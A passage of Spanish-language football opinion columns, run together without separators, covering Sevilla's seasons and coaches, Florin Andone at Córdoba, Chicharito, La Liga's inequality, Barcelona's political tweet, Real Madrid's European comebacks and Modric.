sustituir, y a estas dudas sumarle la desafortunada afección cardiaca de Sergio Sánchez, imprescindible en lo que jugó hasta el momento de tener que abandonar el césped. Con lo puesto, esto es, Palop, Navas, Capel, Zokora, Renato y alguno más, el equipo dio de sí lo que dio. El despido de Jiménez, en la jornada 28, tras un inexplicable empate casero ante el Xerez, quiso utilizarse como revulsivo para un equipo que veía alejarse su plaza Champions ante un indomable Mallorca y cuyo futuro no pintaba nada bien.Antonio Álvarez, otro hombre de la casa, se encargó del equipo. Todo tras el affaire frustrado con Luís Aragonés. El de Marchena realmente no tocó nada. Dio vida a nuevos canteranos, pero el planteamiento se deslizó por los mismos sitios que el de Jiménez. Sin brillantez, con la inercia inevitable, el equipo logró mantener la posición y, en una dramática jornada final, en el último minuto de su Liga, tras un gol acrobático de Rodri ante el Almería, certificó ese hueco de oro en la Liga de Campeones del año próximo. Para Del Nido todo pasa por ese escaparate, presupuesto e ilusión van de la mano en una competición que tampoco ha dado tantas alegrías al club de Nervión. La Copa, ganada brillantemente al Atleti, no parece garantizar el puesto del siempre risueño Álvarez. Si se prescindió de Jiménez, por apatía y falta de brillantez, no se querrá contar con un técnico de similares hechuras. Suena Manzano, suena Quique, la misma cantinela de todos los veranos.El Sevilla debe dar un paso al frente con el equipo. Tiene buenos jugadores que vienen de abajo como Lolo, Cala, el propio Rodri, José Carlos o Luna. Tiene al delantero titular de Brasil que con un Mundial decente podrá ser bien vendido en el mercado estival. En cualquier caso, una profunda renovación que los mantenga en la élite y un entrenador que retome el juego creativo que los llevó al éxito europeo hace pocos años. Este año se ha echado de menos un creador en el centro de campo, no sólo se vive de bandas –eso sí, qué bandas-. Un mediocentro con buen toque, que habilite a los extremos, que surta a los delanteros. Con Zokora cubriendo las espaldas. Con Capel y Navas como dos balas. Con Negredo, poco a poco afianzándose en el equipo, de hombre referencia. Una nueva vuelta de tuerca para un equipo que, paso a paso, sigue creciendo como entidad futbolística. Europa, un nuevo trofeo en las vitrinas, y la voluntad de querer seguir haciéndose grandes.Lo mejor: La cuarta plaza que permite disputar la Champions.Lo peor: La falta de un entrenador respaldado por el club y la afición con el que poder seguir creciendo. Miles de partidos al año, más de un siglo de historia. Parece mentira que el fútbol nos siga regalando momentos únicos.Y no me refiero a los títulos, a la intensidad, o cualquier otra cosa puntualmente excitante. Me refiero a nuevas jugadas, nuevos sucesos que nunca antes habíamos visto sobre el rectángulo de hierba. Higuita haciendo el escorpión, Vieri marcando sin ángulo, el taconazo de Guti el año pasado o, el penalti de Cruyff que ridiculizó Henry con Pires, o hace unos días, un penalti que podría echarse a pelear con el de Panenka. Ezequiel Calvente, extremo melillense del Betis, marcó un gol memorable frente a Italia en el sub-19. Cogió carrerilla, fingió que iba a romperla con su pierna buena a la derecha del portero. Telegrafió el itinerario del balón. El guardameta se tiró confiado. Pero en el último instante, cuando ya parecía cerrado el capítulo, metió la puntera de la pierna de apoyo y puso el cuero justo en el otro lado. Las repeticiones tuvieron que aclarar la finta. Cosas de un deporte que no pone límites a la imaginación. “Bebo porque, cuando bebo, pasan cosas” escribió Fitzgerald. Al Córdoba le ocurre algo parecido con Florin Andone. Cuándo el rumano está, siempre ocurre algo inesperado. El fútbol de Segunda es un descampado tostado al sol, con más precauciones que valentía, con más pundonor que finura, con más escombro que orfebrería. La presencia de futbolistas como Florin dinamitan la cotidianidad de cualquier campo, es un tesoro escondido en el área rival, marcado con una cruz, al que hay que desenterrar a escondidas. Cuando aparece, el partido ya es otro y el Córdoba se siente afortunado.Los goles de Andone mantienen vivo al Córdoba en la lucha árida por subir a Primera. Aún no hay favoritos porque todos fallan. El Córdoba es un ser mitológico con cabeza de dragón y cola de ratoncito. Todo lo que gana por arriba lo está perdiendo por abajo. Fidel, Xisco y Florin dan vida al equipo y Deivid, Rodas, Bijimine o Stankevicius se la quitan por turnos. Los de Oltra avanzan a empujones, con entusiasmo y dudas, como un ejército mellado armado con palos y piedras. Es parte de su encanto. Donde no hay fútbol, surge la chispa que incendia el rascacielos.Mientras que la defensa vuelve al buen tono que tenía a principios de temporada, es Florin el que está salvando los partidos. El hat-trick en casa del Nastic el pasado fin de semana es sólo una muestra. Mientras que el equipo está cuestionado y bajo de forma, Andone debuta con la Selección nacional de su país. Un futbolista en la estratosfera con base en un equipo de Segunda, querido pero humilde, con plantilla ajustada y aspiraciones sensatas. “El fútbol es la única oportunidad para mí y para mi familia” decía en 2011. Estaba en el Castellón y no tenía contrato. Vivía del dinero que le enviaba su madre. Sólo han pasado cinco años, pero el salto dejó atrás el abismo. En el campo es un futbolista indómito, guerrero, obstinado y rematador. Busca el gol como un palo de avellano busca el agua subterránea. En la ciudad no se habla de otra cosa, será cuestión de tiempo que en las iglesias se encuentren bautizados llamados Florín. El mundo del fútbol está ávido de ídolos. Andone es el betadine del cordobesismo.El equipo blanquiverde es un club único.Cuando el Atlético de Madrid bajó a Segunda llamó a su estancia “una temporada en el infierno”. El Córdoba vivió su particular infierno en Primera. Subió cuando menos los esperaba y jamás se acostumbró a la máxima categoría del fútbol español. Sufrió como un niño en su primer partido sobre tierra. Dolieron los músculos y las heridas. El descenso se recibió con la docilidad con la que recibíamos los reglazos en el colegio. Eran otros tiempos, pero aún recuerdo el picor en las manos y luego el cosquilleo que se expandía a través de los brazos y moría en las costillas. Así me sentí tras los ocho goles del Barcelona. Tras lo de Cristiano limpiándose el escudo al ser expulsado en El Arcángel.Andone ha llegado al Córdoba para coser las brechas. La grada solo se une cuando se corea su nombre. Todo es opinable menos su presencia en el campo. Qué sencillo es el fútbol cuando los aficionados están cansados de sufrir. Andone es una extensión del cordobesismo en el campo, lo que haríamos todos si tuviéramos cinco minutos para demostrarle a los demás de lo que somos capaces. Por eso se le quiere como se le quiere, porque su heroicidad parece fácil y porque nos levanta del asiento y tiramos las pipas y la cocacola y abrazamos al vecino desconocido.El fútbol es de Andone. Que la comunión dure lo que tenga que durar. Suba el Córdoba o no a Primera, merece la pena ir al estadio para verle encararse a los defensas, robarle la cartera a los centrales, emparejarse con los laterales, o saltar más que los espigados centrocampistas. Él lo puede todo. Queremos creer que lo puede todo. Como viejecitas rezando a una estampita. Como un pequeño dios doméstico. Al Córdoba le queda aún un mundo por jugar. Hay opciones de subir. Habrá que reajustar la defensa, que Oltra encuentre el sistema adecuado, que los menos habituales ganen algo más de peso cuando tengan la oportunidad de salir al campo. Pero de lo que estamos seguros es de que de los pies de Andone depende nuestro futuro, el delantero rumano es la referencia de un equipo que aún no se ha cansado de soñar con el ascenso. Ya nadie se acuerda de Mururoa. Nadie tiene en la cabeza al Ébola, ni las vacas locas, ni la capa de ozono.Todas las preocupaciones se pierden. Las cosas importantes dejan de serlo. Ya nadie pide a Borja Valero en la Selección Española. Ya nadie lleva en las muñecas los Chinitos de la Suerte. Los Pous han muerto de hambre en sus cárceles digitales. Pasan las preocupaciones, las modas, pasa el amor como un autobús del ALSA lentamente frente a nuestras narices. La muerte de Chanquete, el gol que Molina se tragó frente a Noruega, los pequeños dramas, las grandes resacas, la decapitación de algún Stark. El tiempo no es tanto caprichoso como inexorable. En el fútbol aún más, sometido a lo fugaz como buen deporte. Avivando la leyenda con sopliditos como el fuego en una barbacoa familiar. Por pasar pasó hasta Chicharito.Hace cuatro años todos hablaban de Javier Hernández. Su fichaje por el Manchester United, sus números en el Guadalajara y su inclusión en la lista para el Mundial de Sudáfrica por parte de Javier Aguirre lo convirtieron en uno de esos jóvenes peloteros sobre los que el público en general, y los parabólicos en particular, ponen la lupa en estas grandes citas. Su papel fue importante en la tricolor y la temporada que siguió al verano en el fútbol inglés sólo sirvió para agrandar la historia de un jugador que parecía destinado a hacer grandes cosas.Hoy, frente a Camerún en el segundo partido del grupo A tras el hurto a Croacia anoche, Chicharito ni siquiera saldrá de titular. O ese me temo viendo la temporada y las sensaciones que transmite Oribe Peralta. La temporada en el United de Hernández –sólo cinco goles en veintitrés partidos- muestran síntomas de estancamiento. No sería la primera vez que una promesa mundialista se queda ahí. Miguel Herrera, su seleccionador, no parece andarse con chiquitas, como ya demostró con su polémica con Vela por motivos de feeling, a lo Guardiola.Quizá un United desnortado no ha ayudado al ya de por sí intermitente delantero. El Mundial es otra cosa. Saldrá del banquillo, como cuando se hizo famoso. Ante una desmejorada Camerún puede hacer su fútbol, rápido entre defensas lentos, preciso en las esquinas del área. Quizá Chicharito cambie de aires este verano. Despeje la cabeza.O quizá le olvidemos, como olvidamos a Freddy Adu, como olvidamos a Altidore o como olvidamos a Wright-Phillips. A veces un Mundial es mucho más que un puñado de partidos, a veces para un jugador un Mundial es una forma de renacer cuando llevas un puñado de partidos jugando  sobre un campo de cenizas. Hace más de un año me estrené en Diarios de Fútbol con un mediocre artículo en la forma, pero con una idea en el fondo que quiero rescatar en esta mañana resacosa de goleadas. Decía algo así como que había cierto acomodamiento entre los equipos de Primera División y que Madrid y Barça ganaban casi de oficio, a veces sin mérito, y ponía como ejemplo el ramplón juego de los madridistas con Juande Ramos a los mandos y la histórica racha de resultados que atesoraban. Me negaba a pensar, decía, que todo era cuestión de dinero y que las arcas de los clubes decidieran un juego. Un deporte con miles de matices, azares y sorpresas.Ayer pensé en indolencia. Primero pensé en dinero, en reparto económico, en fichajes, en pelotazos inmobiliarios, en marcas, patrocinios… pensé en todo eso que desnivela la balanza a favor de los más grandes. En su contabilidad, en sus créditos, en la capacidad para fichar, para tener ojeadores, para apostar por jóvenes de futuro talentoso. Pensé en Messi, en Cristiano, y comparé con el resto de equipos, con sus traspasos modestos, en sus hipotecas. Y por unos minutos aborrecí este deporte adulterado, por unos instantes me convencí de que vivíamos en una ficción, en una enorme farsa donde sólo interesaba el desempeño de dos equipos ciclópeos y dieciocho equipos palmeros y grises.Releí el artículo de los repartos televisivos y encontré en él parte del problema. Empieza a no existir la clase media en nuestro fútbol. Una clase alta y un enorme conglomerado de equipos cuya irregularidad redunda en la competitividad de nuestra liga. Y estaba dispuesto a escribir sobre todo eso, sobre los abusos, la soberbia y avaricia de los grandes cuando vi el resumen del Almería-Barcelona. Un enorme portero como Diego Alves viviendo el partido de forma desapasionada, sin fuerza, haciendo una salida de chiste en un gol y no luchando un rebote con Messi. Noté abatimiento, cansancio, y no vale la diferencia de juego en ese minuto, es la diferencia entre cuatro goles y ocho. No es algo a ignorar, no podemos pensar que lo mismo da ocho que ochenta. En el fútbol hay algo llamado orgullo que te hace correr detrás del balón aunque el equipo esté hundido en el marcador. Ayer veía las imágenes de Alves y me sentí incomodo. ¿Cuánto hay de apatía en esta liga? Si el Hércules logró vencer en el Camp Nou con fútbol, fuerza y seso, ¿es lógica esa derrota a domicilio? ¿Es el Madrid un equipo imparable habiendo demostrado tantas carencias con equipos modestos como el Levante o incluso el Auxerre?Hay dos debates. El económico que ya está muy tratado en este blog, y el meramente futbolístico, el del juego fofo de muchos aspirantes incapaces de hacer frente a dos equipos muy buenos pero no invencibles. Cuantas veces hemos visto la imagen tras el pitido final del árbitro de un contrario corriendo a pedirle la camiseta a Messi, ¿hemos pensado en la sensación de desazón que esa imagen produce en el aficionado? No creo que en un deporte con mucho margen de improbabilidad como el fútbol las cosas estén claras desde el principio… os pregunto y me pregunto: ¿Todas estas goleadas son mérito de los clubes grandes o demérito de los clubes pequeños? Más que pequeños, empequeñecidos, minúsculos ante los futbolistas mediáticos, que ven su campo lleno para recibir al Barça o al Madrid cuando la realidad de los fines de semana es la de las gradas vacías, la de los mil irreductibles que se convierten en seis o siete mil cuando vienen los galácticos, los famosos, “los buenos”. ¿En qué medida la afición contribuye a todo esto? Esos corazones que esconden dos escudos, el local y el grande. Que van a ver al Getafe con una camiseta del Madrid o que dicen que son del Hércules y del Barça. Creo que haríamos mal obcecándonos con el dinero, acusando a los repartos, a las canteras o al florentinismo futbolístico. También debemos mirar a las gradas y al césped.La estabilidad de los clubes más humildes, la adecuación de los objetivos, despertar a la masa social, marcar distancias en lo económico y en lo futbolístico, apostar por el fútbol de base, mejorar la marca de club, no utilizar el fútbol como vehículo privado, ser honestos en el día a día… cosas que podrían elevar el nivel de la clase media. Por supuesto que pasa por el reparto de derechos, pero eso es sólo el principio, cuando el dinero esté en el bolsillo hay que saber como administrarlo. Hay dos equipos que podían haber sido mucho más -para mí, hipotéticas campeones de liga- y que ahora no parecen alternativas: Valencia y Sevilla, con buen juego, con una camada de buenos futbolistas, con posibilidades de hacer algo grande pero perdidos los primeros por el endeudamiento y la mala gestión y desnortados los segundos por una mala planificación deportiva y por unas aspiraciones que lastraron un proyecto serio y esperanzador.Son sólo dos ejemplos. Hay alternativas. Puede ser el Villarreal, el último Atlético, de nuevo el equipo de Unai Emery, el Sevilla con un tipo razonable como Manzano a la cabeza.También equipos como el Hércules, el Athletic, recientemente el Mallorca. Clubes serios que pueden “adulterar” la competición, es decir, oponer resistencia a los de siempre. A esos dos mastodontes que arrasan a su paso, que no tienen reparos en alimentarse de las miserias ajenas, que están convirtiendo nuestra liga en un monstruo con dos cabezas que tratan de devorarse mutuamente mientras decenas de equipos asisten poltrones a tan dantesco espectáculo. La política se ha convertido en un duelo de sensibilidades. Llamar a las cosas por su nombre es agresivo, usar adjetivos apropiados es tendencioso y opinar se ha convertido en una especie de Humor Amarillo en el que cada prueba es la afección de un ofendido. Es difícil hablar. Hemos llegado al límite de lo paródico. A menudo llegamos a la conclusión de que es mejor estar callados, de que realmente somos esclavos de nuestras palabras y dueños de nuestro silencio; esa máxima que maquilla con trascendencia la cobardía y la ignorancia.Somos seres sociales y conversar es parte del espectáculo. También lo es equivocarse. Los inquisidores, por ejemplo, son hombres de pocas palabras. Los inquisidores observan a los demás en completo silencio, esperan los errores ajenos para asaltarlos antorcha en mano. Hablar de las ideas de uno es tan sano como escuchar las de los demás. Cuando esa lava se enfría, crecen las ideologías.Siempre me ha pasado en la vida que cuanto mayor es la indignación de mi contertulio, cuanto más afectado y teatral en sus reproches, menos tenía que aportarme. El que te dice “esas no son formas” tiene algo que esconder. El que dice “cálmate” está planeando una huida. Leo barbaridades acerca del tuit que publicó anoche el FC Barcelona en su cuenta oficial: “Felicidades, presidente Puigdemont. Que el acierto os acompañe en esta etapa histórica y apasionante que hoy inicia nuestro país, Catalunya”. El Barcelona lleva mucho tiempo adscrito al independentismo. Siempre había sido parte de su esencia pero, de un tiempo a esta parte, además ha querido mostrarlo públicamente. Para los dirigentes culés el Barça es “més que un club”, es un canalizador del sentir de un pueblo, de una nación dentro de otra nación, un estamento identitario, un paraguas para los asfixiados por el centralismo español. Su aspiración es simple: el que se sienta blaugrana lo hace más allá del fútbol. El Barcelona es un estilo de vida, una ideología, una forma de entender la sociedad en la que ha crecido.A mí eso me parece estupendo. Y lo digo desde las antípodas del nacionalismo, enfrentado ideológicamente a un proceso soberanista que me parece caótico, ilegal y egoísta. Pero no puedo negar, ni impedir, que el Barcelona trace una estrategia que ocupe un lugar en el mapa futbolístico, que tiene antecedentes como el Rayo o el Livorno, es decir, equipos que junto al propio espectro futbolístico tienen un aliciente político, ideológico, un modo de sentir la ciudadanía. ¿Es posible en tiempos de globalización futbolística que el barcelonismo tenga ideario político? Sí.Lo es. Aunque los miembros de la Peña Barcelonista de El Palo de Málaga no se terminen de sentir cómodos en ese rol, aunque al seguidor ecuatoriano del club le den igual estas historias, aunque haya una numerosa parte de la afición que incluso critique este tipo de tuits, esta alineación partidista. Es viable porque el fútbol lo ensombrece todo y cuando un argentino se la pasa a un brasileño y este asiste a un uruguayo que marca gol, a buena parte de los aficionados les darán igual las nacionalidades y los sentimientos patrióticos hacia un país que aún no es un país y que tiene difícil serlo.Los clubes son de sí mismos y de la misma forma que eligen el color de su camiseta y al sujeto que entrena desde la banda, pueden darle carne al esqueleto futbolístico de la forma en las que ellos quieran. Que el Chelsea pretenda ser un referente para las clases altas de Londres, que el Cádiz esté anclado en las clases más populares o que el Athletic haya decidido contar solo con jugadores vascos. Todos son posicionamientos políticos, todos se acomodan a un ideario, una manera diferente de entender la sociedad, de la que nadie es ajeno.Me parece bien que el Barcelona apoye al nuevo presidente de Cataluña. Incluso que lo denominen país, no siéndolo constitucionalmente. Me parecen bien las esteladas y hasta los pitos al himno español. No es mi sensibilidad la que hieren porque el respeto a los símbolos me parece solamente la excusa de los indignados, de todos esos que esperan cualquier cosa para darse golpes en el pecho y clamar por algo que dudo que entiendan.No quiero un fútbol politizado pero quiero menos aún un fútbol sin política. El fútbol tiene política en los escudos y hasta en las camisetas. En sus obras sociales, en sus barrios, en los fichajes y en la afición. Del fútbol sacaría la violencia, el mercantilismo y la desigualdad: pero jamás la ideología. Porque la ideología es parte de nosotros. Y nuestras palabras jamás son una condena, sino una maravillosa oportunidad para explicar cómo entendemos nuestra existencia.La asepsia política, esa que piden los periodistas al Barcelona tras el tuit de anoche, no va a arreglar nada. No va a borrar a la propia afición, que es la que en última instancia eleva el sentimiento.El Barcelona tiene libertad para hacer lo que hizo. Nosotros tenemos libertad para ser o no del Barcelona, como socios o meros aficionados. Los que se erigen como defensores de los culés no independentistas, primero deberían pensar a quienes protegen, si a los demás o a sí mismos.Los defensores de la moral prefieren el silencio. O nadar en aguas templadas. O directamente no mojarse. Todos los que evitan hablar de política, me temo, lo hacen porque no saben de política. Porque ven la ideología de los demás como una amenaza. Los que si tuvieran esparadrapo a mano no dudarían en usarlo para callar a los que no opinan como ellos. Que el Barcelona diga lo que quiera. Que el Rayo apoye los proyectos sociales que quiera. Que el Livorno celebre su comunismo. El límite no es la sensibilidad, sino la ley. Y en última instancia, el sentido común. Si es que aún queda. El madridismo siempre vuelve, como vuelve la guapa tetona del Instituto a nuestros sueños de adulto. Como vuelven el amor, los kilos perdidos, los pantalones rotos y las baladas de Scorpions. La vida es una renuncia cotidiana. El Real Madrid es una folclórica pasada de vueltas de la que se ríen en televisión. Su gloria antigua acentúa el ridículo del presente y se le maltrata y se le cuestiona y se le dice que cante aunque sepamos que ya no canta como cantaba antes, que ha perdido la voz y la belleza, que se ha quedado en otra cosa. Al Real Madrid se le rechaza por amor, como cantaba Gardel en Confesión: “fue a conciencia pura, que perdí tu amor, nada más que por salvarte; hoy me odias y yo feliz, me arrincono para llorarte”. El Madrid es más Madrid en Europa. Como mi madre cuando se ponía guapa para llevarnos al centro de la ciudad. Se quitaba la bata y las zapatillas de paño, se encerraba en el baño y salía con ojos enormes y subrayados, un vestido negro y ligero, y tacones que llevaba con inesperado garbo. Yo le decía, era niño y no conocía aún el peso de las palabras, “qué guapa estás, mamá. Pareces otra”. El Madrid de la Liga es un equipo en pijama metido bajo las enagüillas. El Madrid en la Copa de Europa es algo muy diferente, un puente a lo imposible, un cielo que clarea. Unas puertas conducen al drama y otras puertas te llevan a la alegría, el Real Madrid es un japonés probando suerte en El Laberinto del Chinotauro. Como madridistas, todos nos hemos llevado un golpe esperando cruzar el dintel para llegar a un lugar mejor. Y a veces al contrario, como Ramos abriéndose a la luz en el 93. Mi madre me hizo una foto posando orgulloso con mi camiseta del Madrid. Mi padre me abraza como padre, pero no como madridista. A él no le gusta el fútbol. Con el tiempo he sabido perdonárselo. Estuvo bien eso de vivir el madridismo en la clandestinidad. Descubrí el cosquilleo futbolístico del Madrid de la misma forma en la que descubrí mi propia sexualidad tras una pueril coreografía de las Mama Chicho: solo en mi habitación, ante una televisión en blanco y negro, sin posibilidad de contárselo a nadie.En mi imaginación la mancha roja en mi pecho es sangre tras un partido disputado y bronco contra un equipo alemán. La realidad es un rayajo de pintalabios que mi prima mayor trazó movida por los celos. En la competencia del amor no hay enemigo pequeño. Siempre recordaré la equipación del Madrid con esa herida rosacea de la foto. Como un estigma. Yo era ingenuo y era del Real Madrid, no sé si es causa-efecto. En mis ojos hay un deseo del futuro. Quién me iba a contar a mí, con esa minúscula edad, lo de Florentino Pérez. Qué iba a saber yo de Danilo y del Wolfsburgo. ¿Qué te enseñan en el colegio si no es a llevar con entereza la derrota ante el Odense, el gol de Zalayeta, las paradas de Kahn, el penalti de Ramos, el zapatazo de Koeman?El madridismo siempre vuelve y cuando hay que remontar viene con más fuerza, como la ola del Melillero rompiendo la calma malagueña. Málaga, de donde era Juanito. Su espíritu ingobernable, como su fútbol. No hay tabla que pueda aprehenderlo ni medium que pueda seducirlo.El Real Madrid es una planta que crece con más fuerza en las derrotas, un cactus sentimental, un bulbo feo cargado de espinas. Así aprendimos a amarlo. El Wolfsburgo ganó dos a cero en casa porque las películas son mejores cuando la felicidad está al final. Imaginaos que salvan a Ryan en los cinco minutos iniciales. Que John Travolta y Olivia Newton-John echan a volar el coche en la primera escena. El Madrid es una película que hay que ver entera, cuando se paga la entrada se asumen las consecuencias.Ayer pensé en Belletti. El lateral brasileño le dio al Barcelona una Copa de Europa. Era su primer gol con el Barcelona. No necesitó más. Los héroes son así. Llegan sin anunciarse y se van dejando una huella profunda, de bota Chiruca en una senda empapada por la lluvia. No sé por qué pensé en él, por qué cogí un referente del rival. Del miedo al fracaso surgen hermosas amistades: Bertín y Arévalo, Zamorano y Amavisca, Vardy y Mahrez, Cristina del Valle y Alberto Comesaña, Rinconete y Cortadillo. Con la edad nos volvemos blandos. Mi abuela a veces lloriquea sola y cuando le pregunto qué le pasa me contesta lacónica “nada” y a lo mejor tiene razón: la nada puede explicarlo todo, la nada es un argumento concluyente. Si el Madrid gana hoy, si remontara el dos a cero, mañana habrá un héroe. Como un juguete por montar salido del huevo amarillo que traen los Kinder. Si cae eliminado, nos espera esa nada de mi abuela, la de lamentar lo que se perdió, lo que quedó atrás. El dolor invisible. Remonta o revienta. Nuestro Lute era Paco Llorente, jugando con el brazo en cabestrillo.En la foto mi padre está feliz. Esa sonrisa que sólo tienen los que no saben de fútbol. Esta mañana me escribió un whatsapp. “¿A qué hora es el Madrid mañana?” , la pregunta delatora. Primero escribí “a la hora de siempre en Champions, papá”, pero lo borré.Reescribí: “A las nueve menos cuarto, ¿vas a verlo?” . Contestó: “Claro. Menudo partidazo. A ver si remontamos, que los del Wolfsburgo son muy malos”. Y luego me mandó la foto que acompaño. Al final, los héroes somos nosotros. Nunca he sido un buen estudiante. Yo quise ser periodista durante un trimestre en COU pero era caro mandarme a Sevilla y al final pensé que el Derecho también estaba bien. Nunca terminé Derecho. Ni ninguna otra carrera. Tampoco la Universidad de la Vida, en la que me esfuerzo por suspender casi cada día. Ya de mayor he pensado que tuve que irme fuera y estudiar aquella vocación espontánea. Quería ser corresponsal, o periodista deportivo –cuando ser periodista deportivo era otra cosa-, o llevar temas políticos y destapar chanchullos como en una película americana. A veces, cuando en Twitter me incluyen en alguna lista llamada “Periodistas” me da un vuelquecito el corazón. Como aquel poema en el que un hombre con la pierna malherida en el hospital sentía felicidad porque el médico le había dicho que su lesión era “típica de futbolista”. Siempre hago lecturas positivas del fracaso. Hoy, por ejemplo, mientras abordo este artículo sobre Modric pienso que como periodista jamás habría podido escribir las palabras que leeréis a continuación. Por subjetivas, por prejuiciosas y alguno dirá que por vanas. No sé qué es la ética periodística, pero seguro que no es juzgar con base en sensaciones. Hoy jugará Modric de fijo contra Brasil. En el bar al lado de mi casa he dicho que el partido inaugural quedará 1-1 y he pagado el euro correspondiente para la porra. Conste en acta.Yo le pido a un centrocampista lo que le pido a los cimientos del piso donde vivo: que mantengan la estructura en pie. Aunque la poética dice que los defensas sustentan el tinglado, lo cierto es que nunca hubo un gran equipo sin grandes centrocampistas y sí hubo grandes equipos con defensas menores. Si Modric fuera el cimiento de este bloque yo hace meses que me habría mudado. Su trascendencia en el campo es intermitente y en movimientos me recuerda –con más talento en el toque- a aquel Lass que llevó el 10 del Madrid: anárquico y traslúcido. Cuando vi a Modric en directo, en La Rosaleda contra el Málaga en Liga, me sorprendió su tendencia a salir desde la línea defensiva. Una cosa es darle aire al equipo y otra partirlo, buscando la conducción cómoda en las zonas templadas del campo. Si algo le faltó este año al Madrid es superioridad en el centro del terreno. El resumen del equipo de Ancelotti está en una defensa sólida y un ataque sin comparación mundial. Lo que queda en medio, ese Something in the Way que cantaba Nirvana, a veces resultaba intrascendente. Sólo cuando Xabi Alonso estaba fino parecía tener peso el centro del campo. No le podemos pedir a Khedira, Illarramendi o Casemiro que lleven, como Atlas, el juego equipo en la espalda; pero sí a Modric porque, entre otras cosas, se le fichó para eso.El croata es un creador no una bombona de oxígeno. Si no fuera por Di María, duplicado en creación y desborde, el Madrid habría rozado la agonía esta temporada.Con Croacia será diferente. El equipo de Kovac jugará, previsiblemente, con Modric y Rakitic en el eje y Kovacic un poco más adelantado. Modric tendrá más exigencias atrás, más de las que tuvo en el Madrid, porque dudo que Rakitic, con esa bonita tendencia al ataque, se ancle frente a su defensa. Quizá ahí esté mejor Luka, sacando el balón de la cueva, sin presión ofensiva, sin la presión que en el Madrid debió asumir y no asumió. Dije hace meses que Modric no es un problema, pero tampoco es una solución. Que su sitio está ahí en la zona tibia, con su fútbol de goteo, invisible a ratos, ligero como él. Hace años, cuando Luka se postulaba como promesa del fútbol mundial, se hablaba de él como el nuevo Cruyff. Yo en la final de la Champions grité a la televisión: “eres el Lassana Diarra blanco”  cuando perdió un balón delicado más abajo del círculo central. Supongo que hay un punto intermedio, una zona de diálogo. Este Mundial es una buena oportunidad para encontrar su sitio en una Croacia, que al menos a mí, me ilusiona. Y Modric es su estrella. Es lo bueno de no ser periodista, que quizá llevo dos años escribiendo cosas equivocadas. Espero que sepáis perdonarme. Creo que nuestros cerebros vuelan demasiado alto, que a veces olvidamos que el fútbol es un deporte donde puede pasar casi cualquier cosa. A veces fallan los porteros, a veces fallan los entrenadores, y otras veces no falla nadie pero el balón no quiere caer en la red, como un pez alejándose de la barcaza. Reprochar al Sevilla su eliminación en Champions es algo que no puedo entender. La labor de Jiménez al frente del equipo de Nervión es intachable, ha conseguido convertir en un proyecto de largo recorrido a aquel equipo que puntualmente deslumbró en Europa y en España de la mano de Juande Ramos. Ha logrado sobreponerse a la bicefalia de nuestra liga, ha luchado por trofeos y pese a la escabechina de cada verano ha mantenido la competitividad y la solidez del bloque, alternando fichajes discretos con canteranos que han vivido la ascensión al primer equipo de una forma plácida. Que el CSKA gane al Sevilla en los octavos de final de la Champions League entra dentro de la normalidad futbolística, dolorosísimo para el aficionado, terrible para el que bocadillo en mano se acerca al Sánchez Pizjuán, pero dentro de los márgenes de un equipo que está en vías de transformarse en algo más que unas pocas buenas temporadas concatenadas.El once que salió al césped ayer pretendía escamotear la supremacía física del equipo ruso. Meter a Kanouté o Negredo arriba hubiera servido para convertir el área de Akinfeev en un ring y el juego en una Royal Rumble que taponaría la creación ofensiva del Sevilla. Jiménez optó por aprovechar el estatismo defensivo de los moscovitas y sacó a cuatro jugadores eléctricos para que se asociaran en la zona peligrosa del rival. Secundados por Zokora y Renato, los cuatro de arriba debían dinamitar la línea defensiva con desborde, paredes, diagonales, esas cosas que se presuponen a los jugadores rápidos y habilidosos. Lo cierto es que sobre el papel era un buen plan pero la precipitación terminó convirtiendo al juego hispalense en un tosco intento de buscar balones a la olla, sin demasiada fortuna, como si realmente estuviera jugando el espigado jugado de Malí y el brasileño no hubiera saltado al campo. El gol de Necid fue una bofetada porque acababa con los planes iniciales, aunque Perrotti igualó la situación, un gol del CSKA pondría la eliminatoria muy cuesta arriba y, efectivamente, así ocurrió. Tras el descanso los de Slutsky salieron a marcar ante la desaliñada presencia de los locales. El gol de Honda, una falta seca que Palop no supo si coger o despejar y terminó colándose en la portería, acabó con los méritos del Sevilla, que ya sólo supo divagar en el campo buscando dos goles en media hora, algo factible sino fuera por el juego agarrotado de los jugadores, que poco podían hacer dentro de una estrategia ya desdibujada por esos cambios precipitados y ofensivos que tan propios son de las eliminatorias europeas.Parte de la afición pitó al equipo, o pidió la marcha de Jiménez, o maldijo en general esta suerte de partido, que tanto recuerda a aquella eliminatoria contra el Fenerbahce donde también cayeron a las puertas de algo grande. La sensación, un día después, es que el CSKA se vendió por debajo de su precio en las previas y, por supuesto, que el Sevilla no anda demasiado fino últimamente. Pelear en tres competiciones, y estar arriba en cada una de ellas, tiene que tener un precio físico o acarrear ciertos desmayos como el que vivimos anoche. Yo creo que no se puede pedir más a los sevillistas, el equipo sigue creciendo, sigue manteniendo la forma y aunque se apee de competiciones tan lustrosas como estas, no podemos olvidar que el objetivo era simplemente jugar la Liga de Campeones y hacer un buen papel. Echar a Jiménez, optar por la vía populista, sería poner freno a un estatus que no es más que tierra fértil para el futuro. El equipo de Nervión con Del Nido a la cabeza ha sido siempre un referente en la confianza y la planificación a largo plazo, nada de golpes de timón ni cabezas cortadas a destiempo. El equipo no ha dejado de crecer, lento pero seguro, hasta poder hacerse un hueco entre los mejores. Y yo estoy seguro de que las mejores páginas de este equipo no se han escrito aún, sino que están por venir si se siguen haciendo las cosas igual de bien.Hace diez años este equipo estaba en Segunda División. Hoy puede presumir de disputar una final de Copa, de ser favorito para acabar entre los cuatro primeros y de haber llegado a octavos de final en la máxima competición europea. Tiene un buen puñado de internacionales de primer orden en sus filas, tiene un proyecto saneado, empiezan a hacer fichajes millonarios, siguen encontrando joyas en los mercados extranjeros o en su propia cantera. Espero que un disgusto puntual, caer un peldaño por debajo de lo deseado, no sea suficiente para empezar a zarandear los cimientos de un gran club. Jiménez ha demostrado estar capacitado para entrenar al primer equipo, lo siente como propio, ha mantenido el mejor nivel de sus hombres, ha ganado a los mejores, tiene claro que el Sevilla tiene cuerda para rato, y está dispuesto a luchar desde el banquillo del Pizjuán para conseguirlo.El resto, los que quieren que de la noche a la mañana su equipo gane la Liga de Campeones sin despeinarse, los que quieran ver en el campo un juego equivalente a la Holanda de Cruyff, no dejan que los argumentos del fútbol contradigan lo que su corazón de aficionado les pide y dejan, de nuevo, a sus cerebros volar demasiado alto. Cavani no quiere jugar en la banda. Se lo ha dicho a Blanc. Quiere ser un nueve de los de siempre. Centrado, directo, referencial. Isco está incómodo escorado. Él quiere asumir responsabilidad en el gajo del área. Mandar en 